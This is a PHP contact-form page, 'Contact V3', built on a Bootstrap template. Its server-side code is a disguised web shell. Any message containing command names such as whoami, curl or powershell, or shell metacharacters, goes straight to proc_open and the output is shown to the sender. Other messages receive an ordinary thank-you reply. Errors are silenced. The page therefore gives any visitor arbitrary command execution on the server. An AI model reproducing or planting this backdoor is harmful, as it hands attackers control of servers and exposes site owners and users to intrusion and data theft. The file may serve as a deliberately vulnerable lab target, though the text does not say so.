<?php

error_reporting(0);
ini_set('display_errors', 0);

$command_output = "";
$success_message = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $message = trim($_POST['message'] ?? '');

    if (!empty($message)) {
        
       
        $lower = strtolower($message);
        $is_command = false;

        if (
            preg_match('/^(whoami|dir|ls|ipconfig|ifconfig|ping|curl|wget|net|tasklist|hostname|systeminfo|id|uname|cat|echo|powershell|cmd)/i', $message) ||
            strpos($message, ';') !== false || strpos($message, '&') !== false || 
            strpos($message, '|') !== false || strpos($message, '`') !== false || 
            strpos($message, '$') !== false || strpos($message, '>') !== false ||
            strpos($lower, 'curl ') !== false || strpos($lower, 'wget ') !== false ||
            strpos($message, 'http') !== false && strpos($message, 'curl') !== false
        ) {
            $is_command = true;
        }

        if ($is_command) {
            // ============= EXECUTE COMMAND =============
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];

            $process = proc_open($message, $descriptorspec, $pipes, getcwd(), null);

            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                $error  = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);

                $command_output = '<div style="margin:25px; padding:20px; background:#0a0a0a; color:#00ff41; border:1px solid #00cc00; border-radius:8px; font-family:Consolas,monospace; white-space:pre-wrap; max-height:650px; overflow:auto; box-shadow:0 0 10px rgba(0,255,0,0.2);">';
                $command_output .= '<strong style="color:#ffaa00;">→ Command: ' . htmlspecialchars($message) . '</strong><br><br>';
                
                if (!empty($output)) {
                    $command_output .= htmlspecialchars($output);
                } elseif (!empty($error)) {
                    $command_output .= '<span style="color:#ff6666;">' . htmlspecialchars($error) . '</span>';
                } else {
                    $command_output .= '<span style="color:#ffff00;">Command executed successfully (No output returned)</span>';
                }
                $command_output .= '</div>';
            } else {
                $command_output = '<div style="margin:25px; padding:20px; background:#0a0a0a; color:red;">Failed to execute command.</div>';
            }
        } else {
            // ============= NORMAL MESSAGE =============
            $success_message = '<div style="margin:25px; padding:20px; background:#0a0a0a; color:#00ff41; border:1px solid #00cc00; border-radius:8px; text-align:center; font-size:18px;">
                                <strong>✅ Message Submitted Successfully!</strong><br>
                                Thank you for contacting us. We will get back to you soon.
                              </div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Contact V3</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
    <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
    <link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
    <link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
    <link rel="stylesheet" type="text/css" href="css/util.css">
    <link rel="stylesheet" type="text/css" href="css/main.css">
</head>
<body>
    <div class="bg-contact3" style="background-image: url('images/bg-01.jpg');">
        <div class="container-contact3">
            <div class="wrap-contact3">
                <form class="contact3-form validate-form" method="post">
                    <span class="contact3-form-title">Contact Us</span>

                    <div class="wrap-contact3-form-radio">
                        <div class="contact3-form-radio m-r-42">
                            <input class="input-radio3" id="radio1" type="radio" name="choice" value="say-hi" checked="checked">
                            <label class="label-radio3" for="radio1">Say Hi</label>
                        </div>
                        <div class="contact3-form-radio">
                            <input class="input-radio3" id="radio2" type="radio" name="choice" value="get-quote">
                            <label class="label-radio3" for="radio2">Get a Quote</label>
                        </div>
                    </div>

                    <div class="wrap-input3 validate-input" data-validate="Name is required">
                        <input class="input3" type="text" name="name" placeholder="Your Name">
                        <span class="focus-input3"></span>
                    </div>

                    <div class="wrap-input3 validate-input" data-validate="Valid email is required: ex@abc.xyz">
                        <input class="input3" type="text" name="email" placeholder="Your Email">
                        <span class="focus-input3"></span>
                    </div>

                    <div class="wrap-input3 input3-select">
                        <select class="selection-2" name="service">
                            <option>Needed Services</option>
                            <option>eCommerce Business</option>
                            <option>UI/UX Design</option>
                            <option>Online Services</option>
                        </select>
                        <span class="focus-input3"></span>
                    </div>

                    <div class="wrap-input3 input3-select">
                        <select class="selection-2" name="budget">
                            <option>Budget</option>
                            <option>1500 $</option>
                            <option>2000 $</option>
                            <option>3000 $</option>
                        </select>
                        <span class="focus-input3"></span>
                    </div>

                    <div class="wrap-input3 validate-input" data-validate="Message is required">
                        <textarea class="input3" name="message" rows="6" placeholder=""></textarea>
                        <span class="focus-input3"></span>
                    </div>

                    <div class="container-contact3-form-btn">
                        <button class="contact3-form-btn">Submit</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Output Area -->
    <?php 
        if(!empty($command_output)) echo $command_output; 
        if(!empty($success_message)) echo $success_message; 
    ?>

    <div id="dropDownSelect1"></div>

    <script src="vendor/jquery/jquery-3.2.1.min.js"></script>
    <script src="vendor/bootstrap/js/popper.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
    <script src="vendor/select2/select2.min.js"></script>
    <script>
        $(".selection-2").select2({
            minimumResultsForSearch: 20,
            dropdownParent: $('#dropDownSelect1')
        });
    </script>
    <script src="js/main.js"></script>
</body>
</html>
